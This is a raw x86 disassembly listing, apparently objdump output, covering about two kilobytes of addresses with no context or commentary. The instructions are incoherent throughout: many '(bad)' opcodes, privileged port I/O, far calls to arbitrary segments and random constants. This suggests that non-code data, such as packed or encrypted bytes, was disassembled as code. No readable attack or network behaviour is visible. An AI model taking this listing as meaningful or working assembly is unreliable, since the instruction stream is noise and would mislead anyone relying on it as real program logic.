  426e26:	cmp    ebp,DWORD PTR [esi]
  426e28:	push   esp
  426e29:	mov    ah,0x89
  426e2b:	arpl   WORD PTR [ebp-0x7dbef8ea],di
  426e31:	dec    edi
  426e32:	or     DWORD PTR [eax+0x54f475e7],ecx
  426e38:	push   ss
  426e39:	repnz inc edi
  426e3b:	inc    edi
  426e3c:	mov    esp,0xba449d3b
  426e41:	int3   
  426e42:	xor    DWORD PTR [edi-0x5e],esp
  426e45:	ss sbb al,0x45
  426e48:	cld    
  426e49:	loopne 0x426dff
  426e4b:	mov    BYTE PTR [ecx],cl
  426e4d:	cmp    al,0xdc
  426e4f:	retf   
  426e50:	jmp    0x6c56417
  426e55:	jne    0x426e29
  426e57:	ret    0x611e
  426e5a:	pop    esp
  426e5b:	test   al,0xa0
  426e5d:	adc    dl,BYTE PTR [ecx+0x3c]
  426e60:	mov    ch,0xd5
  426e62:	adc    al,0xe7
  426e64:	or     al,0x67
  426e66:	pop    edx
  426e67:	out    0x33,al
  426e69:	mov    ds:0x608f6915,eax
  426e6e:	mov    dl,0x63
  426e70:	ss lahf 
  426e72:	shl    BYTE PTR [edx-0x51],0xdc
  426e76:	mov    ds:0xcf7f874e,eax
  426e7b:	adc    al,0x8
  426e7d:	loop   0x426ea5
  426e7f:	test   BYTE PTR [ebp-0x21cf3ba8],dh
  426e85:	pusha  
  426e86:	ficom  DWORD PTR [edx-0x69484c44]
  426e8c:	push   0x8ea70e33
  426e91:	stc    
  426e92:	add    edi,DWORD PTR [ebp+0x50]
  426e95:	out    dx,eax
  426e96:	push   ecx
  426e97:	cs lock jle 0x426f03
  426e9b:	call   0x2465:0x7b97902b
  426ea2:	add    ch,BYTE PTR [ecx-0x77ae116b]
  426ea8:	pop    ds
  426ea9:	inc    ecx
  426eaa:	and    BYTE PTR [ecx],bh
  426eac:	sub    al,0x6b
  426eae:	stos   BYTE PTR es:[edi],al
  426eaf:	cmp    ecx,esi
  426eb1:	add    edx,DWORD PTR [eax-0x6cf5b591]
  426eb7:	fld    QWORD PTR [ebx]
  426eb9:	aad    0xeb
  426ebb:	loope  0x426ed3
  426ebd:	pusha  
  426ebe:	sub    al,0xab
  426ec0:	jecxz  0x426eb2
  426ec2:	jb     0x426f0c
  426ec4:	(bad)  
  426ec5:	and    DWORD PTR [ebp+ecx*1+0x1b2fbf88],ebx
  426ecc:	mov    edi,0x8aa2a6a6
  426ed1:	xor    edx,DWORD PTR [edi+0x2e87299d]
  426ed7:	ret    0xd2d0
  426eda:	dec    edx
  426edb:	shr    BYTE PTR [eax+0x2e],1
  426ede:	and    eax,0x3be02349
  426ee3:	lock repnz test al,0x8b
  426ee7:	outs   dx,BYTE PTR ds:[esi]
  426ee8:	popa   
  426ee9:	test   BYTE PTR [eax+0x7b],bl
  426eec:	mov    edx,0xae9c8605
  426ef1:	pop    es
  426ef2:	sub    ch,BYTE PTR [esi]
  426ef4:	lds    eax,FWORD PTR [ebx]
  426ef6:	aaa    
  426ef7:	xchg   BYTE PTR [esi+0xb],bh
  426efa:	push   edi
  426efb:	(bad)  
  426efd:	mov    esp,0x4981285
  426f02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f03:	imul   edx,DWORD PTR gs:[eax],0xffffff98
  426f07:	sub    BYTE PTR [ebx+0x6979ac8b],dh
  426f0d:	(bad)  
  426f0e:	mov    esi,0x8a4bac98
  426f13:	ss inc edx
  426f15:	xor    edx,DWORD PTR [eax+eax*1+0x9]
  426f19:	and    eax,0xf69b1eb2
  426f1e:	cli    
  426f1f:	test   DWORD PTR [esi-0x2bd940bb],0xfe32f6ae
  426f29:	dec    esi
  426f2a:	mov    ebp,0x7fd4b531
  426f2f:	jle    0x426f1c
  426f31:	jle    0x426f65
  426f33:	imul   edi,DWORD PTR [esi-0x4a21a2f8],0x7f5cb434
  426f3d:	popa   
  426f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f3f:	sub    ecx,ecx
  426f41:	ja     0x426f8d
  426f43:	and    eax,0xbab341b9
  426f48:	test   DWORD PTR [edx-0x48b709da],eax
  426f4e:	stc    
  426f4f:	push   0x3c
  426f51:	scas   eax,DWORD PTR es:[edi]
  426f52:	dec    eax
  426f53:	add    bl,BYTE PTR [edx]
  426f55:	ficomp WORD PTR [esp+ebx*2-0x61f9eaa5]
  426f5c:	shl    ebx,1
  426f5e:	add    dl,BYTE PTR [eax]
  426f60:	shr    al,0x89
  426f63:	repnz fbstp TBYTE PTR [eax-0x2c]
  426f67:	xchg   esp,eax
  426f68:	daa    
  426f69:	xor    BYTE PTR [ebp+edi*1+0x66],ah
  426f6d:	(bad)  
  426f6e:	mov    ebx,0xea907f6f
  426f73:	aaa    
  426f74:	mov    eax,0xc355b07e
  426f79:	xor    DWORD PTR [eax+0x39e3f7eb],edx
  426f7f:	xchg   edi,eax
  426f80:	pop    ss
  426f81:	jge    0x426f9c
  426f83:	inc    ebp
  426f84:	jecxz  0x426f61
  426f86:	popf   
  426f87:	(bad)  
  426f88:	mov    DWORD PTR [edi+0x3b],ebx
  426f8b:	sub    al,0xc8
  426f8d:	and    bl,dl
  426f8f:	pop    ds
  426f90:	out    dx,eax
  426f91:	mov    dh,0x17
  426f93:	sub    eax,0x4fc8911f
  426f98:	cld    
  426f99:	scas   eax,DWORD PTR es:[edi]
  426f9a:	dec    edi
  426f9b:	jmp    0x427015
  426f9d:	pusha  
  426f9e:	xchg   ebp,eax
  426f9f:	add    DWORD PTR [ebp-0x480be97c],eax
  426fa5:	dec    ebx
  426fa6:	adc    ebx,esp
  426fa8:	lods   eax,DWORD PTR ds:[esi]
  426fa9:	fs mov esi,0xb66791a8
  426faf:	and    esi,ebx
  426fb1:	push   0xffffff89
  426fb3:	adc    dh,BYTE PTR [esi]
  426fb5:	neg    BYTE PTR [edx-0x39]
  426fb8:	push   edx
  426fb9:	cmp    al,0xe9
  426fbb:	mov    BYTE PTR [ebx-0x7d],dh
  426fbe:	lods   al,BYTE PTR ds:[esi]
  426fbf:	add    al,0x20
  426fc1:	push   esi
  426fc2:	inc    ebx
  426fc3:	mov    cl,0xf9
  426fc5:	int    0xa1
  426fc7:	sahf   
  426fc8:	sbb    al,dl
  426fca:	jo     0x427029
  426fcc:	jl     0x427043
  426fce:	mov    bh,0x41
  426fd0:	out    dx,al
  426fd1:	fnstsw WORD PTR [ebx-0x44]
  426fd4:	mov    al,ds:0x679c1750
  426fd9:	fstp   QWORD PTR [edx]
  426fdb:	mov    bh,BYTE PTR [ebp+0x4f]
  426fde:	sub    BYTE PTR [esi],dl
  426fe0:	adc    esp,esi
  426fe2:	scas   eax,DWORD PTR es:[edi]
  426fe3:	xor    esp,DWORD PTR [edi+0x49b059e8]
  426fe9:	clc    
  426fea:	inc    ebx
  426feb:	adc    al,0x5e
  426fed:	lods   al,BYTE PTR ds:[esi]
  426fee:	test   BYTE PTR [eax],bh
  426ff0:	outs   dx,BYTE PTR ds:[esi]
  426ff1:	or     al,ah
  426ff3:	rcr    edx,1
  426ff5:	lea    ebx,[edi+edx*2-0x2391270e]
  426ffc:	cwde   
  426ffd:	add    BYTE PTR [edx],dh
  426fff:	mov    ecx,0xe58ec8f7
  427004:	jne    0x426fd7
  427006:	inc    ebx
  427007:	and    eax,0x66c2dad6
  42700c:	call   0xd417:0x51f8f3bc
  427013:	mov    ds:0x9caa9606,al
	...
  427020:	add    BYTE PTR [ebx],bl
  427022:	inc    ebp
  427023:	gs ret 
  427025:	jg     0x42700a
  427027:	mov    edi,0x3db787dd
  42702c:	rcl    BYTE PTR [edi],cl
  42702e:	dec    ebp
  42702f:	cmp    al,0x56
  427031:	(bad)  
  427032:	out    0x1,al
  427034:	add    BYTE PTR [edi-0x65fffffd],ch
  42703a:	out    dx,al
  42703b:	mov    eax,ds:0x74ed0bb5
  427040:	inc    ebp
  427041:	les    edx,FWORD PTR [edx]
  427043:	ret    0x6bfa
  427046:	ins    BYTE PTR es:[edi],dx
  427047:	add    al,0xb3
  427049:	jns    0x42702d
  42704b:	imul   esp,DWORD PTR [ecx-0x4f],0x52
  42704f:	sub    esi,DWORD PTR [eax-0x7569d175]
  427055:	bound  esi,QWORD PTR [esi+ebx*8]
  427058:	cmp    ebp,DWORD PTR [edi-0x2f]
  42705b:	push   ebp
  42705c:	imul   DWORD PTR [edx]
  42705e:	std    
  42705f:	sub    al,0xfd
  427061:	adc    al,0xd0
  427063:	and    DWORD PTR [edx+0x5b],0xffffffcc
  427067:	adc    ebp,DWORD PTR [edx-0x2cb2df83]
  42706d:	int    0x62
  42706f:	gs icebp 
  427071:	test   al,0x3f
  427073:	xor    BYTE PTR [eax-0x7c49dba1],al
  427079:	push   0xdfabaa80
  42707e:	in     al,dx
  42707f:	or     DWORD PTR ds:0xf712d77f,edx
  427085:	xchg   edx,eax
  427086:	test   al,0x95
  427088:	xlat   BYTE PTR fs:[ebx]
  42708a:	xor    eax,0x7489ffbb
  42708f:	mov    edx,0x9fd194fe
  427094:	xchg   edx,eax
  427095:	dec    esi
  427096:	push   cs
  427097:	add    ebx,ebp
  427099:	mov    ah,0x4d
  42709b:	mov    esi,0xbca6798e
  4270a1:	lock mov ds:0xac689c1d,eax
  4270a7:	ja     0x427077
  4270a9:	je     0x4270b4
  4270ab:	out    0x96,eax
  4270ad:	cmp    bh,BYTE PTR [ebp-0x34ea273c]
  4270b3:	inc    edx
  4270b4:	add    cl,cl
  4270b6:	xchg   cl,al
  4270b8:	ins    BYTE PTR es:[edi],dx
  4270b9:	dec    ebp
  4270ba:	outs   dx,DWORD PTR ds:[esi]
  4270bb:	jp     0x4270a3
  4270bd:	jmp    0x427091
  4270bf:	lea    edx,[ebx]
  4270c1:	cld    
  4270c2:	jecxz  0x427116
  4270c4:	test   al,0x7f
  4270c6:	(bad)  
  4270c7:	stos   DWORD PTR es:[edi],eax
  4270c8:	div    ecx
  4270ca:	test   eax,0x9e976c1f
  4270cf:	ret    0x7b39
  4270d2:	out    dx,al
  4270d3:	push   cs
  4270d4:	retf   0xdffc
  4270d7:	test   eax,0xa554da7
  4270dc:	adc    eax,0x4d4993a6
  4270e1:	(bad)  
  4270e2:	test   BYTE PTR [ebp+0x5d],0x5a
  4270e6:	lds    esp,FWORD PTR [ebx]
  4270e8:	sti    
  4270e9:	out    dx,eax
  4270ea:	inc    ebp
  4270eb:	sbb    ch,BYTE PTR es:[esi]
  4270ee:	imul   eax,DWORD PTR [eax+0x3d],0x8fcdf367
  4270f5:	faddp  st(5),st
  4270f7:	mov    eax,ds:0xf35cdd59
  4270fc:	stos   DWORD PTR es:[edi],eax
  4270fd:	in     eax,dx
  4270fe:	dec    edi
  4270ff:	add    cl,BYTE PTR [ecx+ebp*2+0x22]
  427103:	sbb    BYTE PTR [ecx-0x2ebb3bc4],ah
  427109:	test   al,0xaa
  42710b:	and    esi,DWORD PTR [ecx+0x26c734fe]
  427111:	mov    ?,WORD PTR [esi-0x2]
  427114:	lods   al,BYTE PTR ds:[esi]
  427115:	into   
  427116:	adc    ah,ah
  427118:	and    DWORD PTR [ebp-0x6f],ebp
  42711b:	jge    0x4270ea
  42711d:	ja     0x4270a9
  42711f:	cwde   
  427120:	retf   
  427121:	in     al,0x89
  427123:	sti    
  427124:	rcr    bh,0x2f
  427127:	pop    ebx
  427128:	fwait
  427129:	scas   eax,DWORD PTR es:[edi]
  42712a:	push   ebx
  42712b:	rcr    BYTE PTR ds:0xa13e83bf,1
  427131:	dec    esp
  427132:	mov    ds:0x763baeca,al
  427137:	xor    ecx,DWORD PTR [ebx-0x170327ab]
  42713d:	(bad)  
  42713e:	scas   al,BYTE PTR es:[edi]
  42713f:	push   ecx
  427140:	into   
  427141:	aaa    
  427142:	xchg   DWORD PTR [eax+0x15a3d91b],edi
  427148:	ins    DWORD PTR es:[edi],dx
  427149:	std    
  42714a:	fmul   st(3),st
  42714c:	add    BYTE PTR [edi+0x61350a9c],0xb6
  427153:	xchg   esi,eax
  427154:	mov    ch,0xb8
  427156:	out    0x6a,eax
  427158:	push   ss
  427159:	pushf  
  42715a:	add    al,0x74
  42715c:	scas   eax,DWORD PTR es:[edi]
  42715d:	call   0x6689:0x5559c3e4
  427164:	mov    ecx,0x4fd59bf8
  427169:	int3   
  42716a:	test   al,0xc6
  42716c:	sub    eax,0xc6e51082
  427171:	gs mov ebx,0xf70b1b40
  427177:	imul   ebx,ecx,0x2f626000
  42717d:	inc    esi
  42717e:	xchg   BYTE PTR [edi-0x668bcfa5],ah
  427184:	mov    al,0x10
  427186:	jo     0x427175
  427188:	mov    ds:0xc0333d31,al
  42718d:	adc    DWORD PTR [esi+esi*8],esi
  427190:	adc    al,0x6b
  427192:	mov    dl,0x99
  427194:	lea    eax,[ebx]
  427196:	ss jnp 0x4271aa
  427199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42719a:	jno    0x4271df
  42719c:	(bad)  
  42719d:	cmp    DWORD PTR [edx+0x5ffe44bf],ebx
  4271a3:	xchg   esp,eax
  4271a4:	jl     0x427185
  4271a6:	sar    bh,1
  4271a8:	push   ds
  4271a9:	add    eax,0x13199b6d
  4271ae:	adc    edx,DWORD PTR [ecx+eax*4+0x51]
  4271b2:	stos   DWORD PTR es:[edi],eax
  4271b3:	inc    esp
  4271b4:	aam    0xe4
  4271b6:	pop    ebx
  4271b7:	xchg   ch,al
  4271b9:	cmp    ebx,edx
  4271bb:	add    DWORD PTR [ecx+0x58],eax
  4271be:	xlat   BYTE PTR ds:[ebx]
  4271bf:	fmul   DWORD PTR [eax]
  4271c1:	call   0xfa458d82
  4271c6:	jno    0x42717d
  4271c8:	or     ebx,edx
  4271ca:	fxch   st(4)
  4271cc:	adc    DWORD PTR [edi+0x72],ecx
  4271cf:	jmp    0xaa0d:0x552c09b0
  4271d6:	mov    ebp,0x68dfcf11
  4271db:	mov    al,0x21
  4271dd:	inc    esp
  4271de:	dec    ecx
  4271df:	sbb    eax,0x6481fbe6
  4271e4:	jge    0x427170
  4271e6:	arpl   ax,sp
  4271e8:	xor    ebp,ebp
  4271ea:	cmp    eax,0xcb54842e
  4271ef:	xchg   dh,dh
  4271f1:	ret    0x85ae
  4271f4:	ror    DWORD PTR [ecx-0x43],0xe8
  4271f8:	out    0x61,eax
  4271fa:	jno    0x42720f
  4271fc:	push   es
  4271fd:	pop    esi
  4271fe:	mov    esi,0x79ed1080
  427203:	mov    al,ds:0x44eee03b
  427208:	in     al,0x33
  42720a:	ret    0x6f02
  42720d:	add    dh,dh
  42720f:	jne    0x427202
  427211:	scas   al,BYTE PTR es:[edi]
  427212:	(bad)  
  427213:	mov    bh,0xa7
  427215:	(bad)  
  427216:	sbb    cl,ah
  427218:	imul   DWORD PTR ds:0x317a98c1
  42721e:	js     0x4271a6
  427220:	(bad)  
  427221:	sbb    bl,BYTE PTR [esi+eax*2-0x61]
  427225:	imul   ebp,DWORD PTR [edi+0x12b09d3c],0xffffffe1
  42722c:	mov    ebp,0xb540d161
  427231:	test   BYTE PTR [edi],ch
  427233:	pop    esi
  427234:	(bad)
  427238:	arpl   WORD PTR [eax+ecx*1-0x52],si
  42723c:	mov    al,0xf4
  42723e:	dec    esp
  42723f:	in     eax,dx
  427240:	sub    DWORD PTR [esi+0x3c93cf29],0x19a8636
  42724a:	sar    DWORD PTR [esi],cl
  42724c:	mov    fs,ebx
  42724e:	pop    ebx
  42724f:	cmp    eax,0x508f07c2
  427254:	mov    edx,0x24878f49
  427259:	or     al,0x62
  42725b:	xor    eax,0xbd6f2513
  427260:	aas    
  427261:	sub    bl,cl
  427263:	scas   eax,DWORD PTR es:[edi]
  427264:	jmp    0x4272cc
  427266:	and    eax,0xddb4226c
  42726b:	retf   0x2c54
  42726e:	xchg   ebp,ebp
  427270:	in     eax,0x5d
  427272:	add    DWORD PTR [ebx+ebx*2+0x7b],esi
  427276:	adc    eax,0x81e57cf5
  42727b:	cdq    
  42727c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42727d:	inc    eax
  42727e:	enter  0x4c24,0x56
  427282:	add    eax,0x98fc1711
  427287:	or     DWORD PTR [edx],esi
  427289:	xchg   BYTE PTR [ebx],bl
  42728b:	outs   dx,DWORD PTR ds:[esi]
  42728c:	push   eax
  42728d:	fstp   QWORD PTR [eax+0x5f]
  427290:	lods   al,BYTE PTR ds:[esi]
  427291:	jno    0x4272ef
  427293:	or     eax,0xe14999db
  427298:	daa    
  427299:	mov    cl,0x91
  42729b:	jb     0x427288
  42729d:	into   
  42729e:	es xchg ecx,eax
  4272a0:	in     al,0x5f
  4272a2:	jp     0x427286
  4272a4:	adc    BYTE PTR [ebx+0x3a29b2ab],al
  4272aa:	ss xchg esp,eax
  4272ac:	cmp    dx,0x8c7c
  4272b1:	push   0x9bc1a8c8
  4272b6:	pop    eax
  4272b7:	inc    edi
  4272b8:	adc    eax,0xa4050ba8
  4272bd:	in     al,0x5
  4272bf:	adc    dh,dl
  4272c1:	xchg   ebx,eax
  4272c2:	xlat   BYTE PTR ds:[ebx]
  4272c3:	shl    BYTE PTR ds:0xa9cffa40,cl
  4272c9:	stc    
  4272ca:	fnstcw WORD PTR es:[edi]
  4272cd:	mov    eax,0x4ddcb838
  4272d2:	sbb    al,0xbd
  4272d4:	jmp    0xd7c5:0x569ab4a1
  4272db:	sub    ebx,ebp
  4272dd:	test   al,0xe3
  4272df:	jle    0x427331
  4272e1:	and    esp,ecx
  4272e3:	jbe    0x427287
  4272e5:	adc    DWORD PTR [ebx+0x30],ebx
  4272e8:	xchg   ebx,ecx
  4272ea:	out    dx,al
  4272eb:	pop    eax
  4272ec:	out    0x91,eax
  4272ee:	add    BYTE PTR [ebx+0x2def26e3],bl
  4272f4:	cmp    eax,0xf7a53229
  4272f9:	ja     0x4272e8
  4272fb:	mov    ecx,0x98447ee5
  427300:	jmp    0xc91c:0xb3686a1d
  427307:	jne    0x42737a
  427309:	js     0x4272b3
  42730b:	in     al,0xc9
  42730d:	cwde   
  42730e:	pop    ebp
  42730f:	push   0x8faf78db
  427314:	xchg   esp,eax
  427315:	(bad)  
  427316:	cmp    BYTE PTR [edx-0x6ed78607],ch
  42731c:	jp     0x4272b1
  42731e:	dec    esi
  42731f:	retf   0xb097
  427322:	dec    esp
  427323:	gs arpl cx,dx
  427326:	fdivr  QWORD PTR [esi]
  427328:	dec    edx
  427329:	arpl   WORD PTR [edi-0x286cd037],cx
  42732f:	in     al,0xb4
  427331:	xchg   esi,eax
  427332:	and    bh,ah
  427334:	shl    bl,cl
  427336:	test   cl,cl
  427338:	sti    
  427339:	or     esp,0xffffffed
  42733c:	scas   al,BYTE PTR es:[edi]
  42733d:	mov    eax,ds:0x3a4107c6
  427342:	jmp    0x427354
  427344:	into   
  427345:	pushf  
  427346:	cdq    
  427347:	push   edx
  427348:	fcomp  st(6)
  42734a:	jle    0x427314
  42734c:	jo     0x427346
  42734e:	xchg   ebp,eax
  42734f:	enter  0x1980,0x8f
  427353:	in     al,0xaf
  427355:	mov    ebx,0x53dbc7ff
  42735a:	mov    ebx,0xc22396ff
  42735f:	pop    ss
  427360:	xor    BYTE PTR [esi-0x7a],0x4c
  427364:	(bad)  
  427365:	adc    eax,0xa75b6edc
  42736a:	ja     0x42737a
  42736c:	adc    BYTE PTR [ecx-0x3d],cl
  42736f:	repnz cmp al,0x7e
  427372:	out    0x20,eax
  427374:	jmp    0x6ef42238
  427379:	(bad)  
  42737a:	call   ecx
  42737c:	mov    eax,ds:0x80524a7e
  427381:	dec    ecx
  427382:	aas    
  427383:	jg     0x427385
  427385:	stos   BYTE PTR es:[edi],al
  427386:	push   ecx
  427387:	pop    ecx
  427388:	mov    bl,0xd2
  42738a:	xchg   esp,eax
  42738b:	pop    esi
  42738c:	rcr    DWORD PTR [esi+0x70b77279],cl
  427392:	in     eax,0xd6
  427394:	mov    eax,ds:0xf743a3d5
  427399:	mov    ecx,0xbe411e4d
  42739e:	adc    ecx,esp
  4273a0:	cwde   
  4273a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4273a3:	sbb    bh,BYTE PTR [edi+0x33]
  4273a6:	enter  0xcd3,0x58
  4273aa:	and    edx,edx
  4273ac:	hlt    
  4273ad:	pop    ebx
  4273ae:	inc    ebx
  4273af:	ror    DWORD PTR gs:[edi],0x56
  4273b3:	fstp   st(6)
  4273b5:	sub    edi,DWORD PTR [edx]
  4273b7:	adc    eax,ebp
  4273b9:	or     eax,0x9dc253d2
  4273be:	jne    0x427438
  4273c0:	mov    ebp,ecx
  4273c2:	arpl   WORD PTR [ebp-0x6eb03679],ax
  4273c8:	or     eax,0xdf5d512
  4273cd:	sbb    eax,0x4f
  4273d0:	cdq    
  4273d1:	push   ebx
  4273d2:	ds ret 0x27bc
  4273d6:	stos   DWORD PTR es:[edi],eax
  4273d7:	pop    esp
  4273d8:	pop    ebp
  4273d9:	sti    
  4273da:	pop    esi
  4273db:	pop    edi
  4273dc:	dec    ebp
  4273dd:	popf   
  4273de:	jmp    0xf09ae62f
  4273e3:	and    bh,BYTE PTR [eax]
  4273e5:	repnz scas al,BYTE PTR es:[edi]
  4273e7:	inc    BYTE PTR [eax]
	...
  4273f1:	or     al,0x47
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0xb19f609
  4273fe:	call   0x1:0xeaadc0c7
  427405:	scas   eax,DWORD PTR es:[edi]
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    BYTE PTR [eax-0x76],dh
  42740b:	call   0x44ec:0xd390d987
  427412:	and    eax,0x45db6dae
  427417:	(bad)  
  427418:	xchg   edx,eax
  427419:	inc    eax
  42741b:	inc    esi
  42741c:	das    
  42741d:	sbb    al,0xda
  42741f:	sbb    BYTE PTR [ebp-0x2a499c90],ch
  427425:	mov    al,ds:0xcd841668
  42742a:	dec    esi
  42742b:	dec    ebp
  42742c:	shr    DWORD PTR [ebx-0x478738df],1
  427432:	stc    
  427433:	push   esp
  427434:	push   0xffffffc6
  427436:	stos   DWORD PTR es:[edi],eax
  427437:	cdq    
  427438:	and    BYTE PTR [esp+edx*8],0x1d
  42743c:	push   0x271f1a02
  427441:	inc    ecx
  427442:	iret   
  427443:	popf   
  427444:	and    eax,0xc36f9b21
  427449:	clc    
  42744a:	dec    edx
  42744b:	stos   BYTE PTR es:[edi],al
  42744c:	pusha  
  42744d:	div    BYTE PTR [ecx]
  42744f:	sub    DWORD PTR gs:[ecx+0x79],ebp
  427453:	push   edi
  427454:	lahf   
  427455:	shl    BYTE PTR [edi+0xfacd227],cl
  42745b:	stos   BYTE PTR es:[edi],al
  42745c:	push   eax
  42745d:	test   DWORD PTR ds:0xbe0b4d56,edx
  427463:	and    al,0xda
  427465:	push   eax
  427466:	push   eax
  427467:	(bad)  
  427468:	stc    
  427469:	push   eax
  42746a:	pop    es
  42746b:	pop    ecx
  42746c:	mov    eax,0xaa792a88
  427471:	arpl   sp,si
  427473:	out    dx,al
  427474:	add    ch,BYTE PTR [eax]
  427476:	jmp    0x427461
  427478:	clc    
  427479:	pusha  
  42747a:	fstp   DWORD PTR [edx+0x41754fd]
  427480:	les    esp,FWORD PTR [ebp-0x7a]
  427483:	ja     0x42746a
  427485:	xchg   ecx,eax
  427486:	fistp  WORD PTR [ebx-0x26]
  427489:	jno    0x427473
  42748b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42748c:	call   DWORD PTR [eax]
  42748e:	outs   dx,DWORD PTR ds:[esi]
  42748f:	xchg   ecx,eax
  427490:	scas   eax,DWORD PTR es:[edi]
  427491:	jmp    0x77c3:0xf3209061
  427498:	(bad)  
  427499:	popa   
  42749a:	push   es
  42749b:	sub    BYTE PTR [ebp+0x67],0xaf
  42749f:	or     BYTE PTR [eax+ecx*2+0x50f7d952],cl
  4274a6:	mov    dl,BYTE PTR [ebx-0x3f45043b]
  4274ac:	into   
  4274ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274ae:	sbb    al,0xa4
  4274b0:	mov    esi,0x515d2c15
  4274b5:	jae    0x4274f9
  4274b7:	pop    ss
  4274b8:	mov    ch,0xc5
  4274ba:	cmp    bh,ch
  4274bc:	and    BYTE PTR [ebx+0x7e],cl
  4274bf:	xor    bh,0xfb
  4274c2:	lock jns 0x4274aa
  4274c5:	stos   DWORD PTR es:[edi],eax
  4274c6:	push   edx
  4274c7:	gs scas al,BYTE PTR es:[edi]
  4274c9:	rcl    DWORD PTR [ebp-0x3d007cd3],0x31
  4274d0:	mov    eax,0xd27ce57f
  4274d5:	pusha  
  4274d6:	call   0x5046437c
  4274db:	push   cs
  4274dc:	mov    edx,0x529b3e35
  4274e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274e2:	fmul   QWORD PTR [ebp-0x75]
  4274e5:	mov    ds:0x611a6174,eax
  4274ea:	sti    
  4274eb:	push   cs
  4274ec:	mov    ebp,0x406d6f38
  4274f1:	call   0xd593:0xaa204931
  4274f8:	add    ah,ch
  4274fa:	pop    esi
  4274fb:	cmp    eax,0x7ef09955
  427500:	aam    0xaa
  427502:	stos   BYTE PTR es:[edi],al
  427503:	js     0x4274a6
  427505:	mov    ds:0x67bda53e,al
  42750a:	add    DWORD PTR [ebx-0x3e],eax
  42750d:	cdq    
  42750e:	dec    edx
  42750f:	push   0xffffffb5
  427511:	shl    esi,0xe4
  427514:	clc    
  427515:	jmp    edi
  427517:	sub    DWORD PTR [edi+0x72],esp
  42751a:	jge    0x42749d
  42751c:	jo     0x4274da
  42751e:	dec    edx
  42751f:	xchg   ecx,eax
  427520:	out    dx,al
  427521:	push   ss
  427522:	and    esi,DWORD PTR [ebx-0x51]
  427525:	ret    0x2c6f
  427528:	dec    eax
  427529:	imul   ebx,esp,0x1e
  42752c:	data16 mov cl,0xa4
  42752f:	lds    eax,FWORD PTR [ecx+edx*8-0x7f]
  427533:	fistp  WORD PTR [edx+ebx*1]
  427536:	(bad)
  427539:	push   eax
  42753a:	stos   BYTE PTR es:[edi],al
  42753b:	xchg   edx,eax
  42753c:	sub    BYTE PTR [edx-0x5b],0xe7
  427540:	ss into 
  427542:	call   0xdb9b:0xed389b25
  427549:	popa   
  42754a:	fcmovnb st,st(2)
  42754c:	scas   al,BYTE PTR es:[edi]
  42754d:	je     0x4275b6
  42754f:	retf   0xb27
  427552:	pop    ss
  427553:	sub    DWORD PTR [ebp+0x3df4c13d],esi
  427559:	add    esp,DWORD PTR [edx-0x6920b500]
  42755f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427560:	cmp    eax,0x6f06a3fb
  427565:	mov    esi,DWORD PTR [ebp-0x6a]
  427568:	and    al,0x7b
  42756a:	arpl   WORD PTR [edx+0x2b6cf4b0],cx
  427570:	(bad)  
  427571:	fwait
  427572:	leave  
  427573:	pop    ecx
  427574:	mov    cl,0xdf
  427576:	inc    edx
  427577:	cs push ecx
  427579:	or     eax,DWORD PTR [ebp-0x26]
  42757c:	sbb    DWORD PTR [ecx],edx
  42757e:	lods   eax,DWORD PTR ds:[esi]
  42757f:	cmp    al,BYTE PTR [ecx]
  427581:	ret    0x3f5f
  427584:	cmp    DWORD PTR [edi+ebp*4+0x30beec56],ebx
  42758b:	or     BYTE PTR [ecx-0x28e7d89d],ah
  427591:	bound  edi,QWORD PTR [ebx+0x54]
  427594:	jnp    0x42752a
  427596:	sbb    ebx,ebx
  427598:	mov    BYTE PTR [edx+0x3],ah
  42759b:	shr    BYTE PTR [edi+0x3850168c],0x6e
  4275a2:	xchg   esp,eax
  4275a3:	cdq    
  4275a4:	rol    DWORD PTR [esi-0x36],1
  4275a7:	shl    DWORD PTR [esi],0xc7
  4275aa:	push   es
  4275ab:	ja     0x4275cf
  4275ad:	and    al,0xf6
  4275af:	xchg   esp,eax
  4275b0:	ficomp WORD PTR [edx-0x87a8193]
  4275b6:	pop    edx
  4275b7:	pop    ebx
  4275b8:	in     al,0x4a
  4275ba:	jae    0x42757f
  4275bc:	dec    edi
  4275bd:	and    bh,bh
  4275bf:	hlt    
  4275c0:	test   dh,bl
  4275c2:	mov    eax,0x5471852f
  4275c7:	cmp    edi,DWORD PTR [edx]
  4275c9:	and    al,BYTE PTR [ecx+0x6198cd5a]
  4275cf:	stc    
  4275d0:	cmp    esp,DWORD PTR [ebp-0x289ddbb3]
  4275d6:	sub    DWORD PTR [edx+eiz*4],esi
  4275d9:	xchg   BYTE PTR [eax],cl
  4275db:	xor    al,0x11
  4275dd:	les    esp,FWORD PTR [ecx]
  4275df:	adc    edi,DWORD PTR [ebx]
  4275e1:	xchg   ecx,eax
  4275e2:	xchg   DWORD PTR [edi],edi
  4275e4:	adc    ebx,ecx
  4275e6:	daa    
  4275e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275e8:	xchg   ebx,eax
  4275e9:	div    ebx
  4275eb:	dec    edx
  4275ec:	popa   
  4275ed:	and    DWORD PTR [ebx],edi
  4275ef:	icebp  
  4275f0:	xchg   ebp,eax
  4275f1:	push   ebx
  4275f2:	inc    edx
  4275f3:	out    0xb2,al
  4275f5:	push   es
  4275f6:	xchg   ecx,eax
  4275f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275f8:	add    esi,DWORD PTR [eax]
  4275fa:	pop    edi
  4275fb:	push   ds
  4275fc:	pusha  
  4275fd:	xchg   DWORD PTR [ecx+0x25],ecx
  427600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427601:	out    0x8b,eax
  427603:	pop    ebp
  427604:	mov    esp,0x51667363
  427609:	pop    eax
